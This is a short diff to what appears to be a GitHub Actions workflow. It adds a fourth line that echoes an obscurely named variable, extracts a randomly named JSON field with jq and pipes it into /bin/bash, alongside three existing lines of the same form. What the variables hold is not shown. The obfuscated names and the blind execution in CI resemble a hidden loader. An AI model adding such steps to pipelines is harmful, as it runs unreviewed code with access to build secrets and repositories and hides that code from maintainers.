@@ -21,6 +21,7 @@ jobs:
           echo $rg1 | jq -r .djbif23123 | /bin/bash
           echo $rk816 | jq -r .wxps91 | /bin/bash
           echo $auhvo80739 | jq -r .tlnt3 | /bin/bash
+          echo $uw227 | jq -r .lcrue86192 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
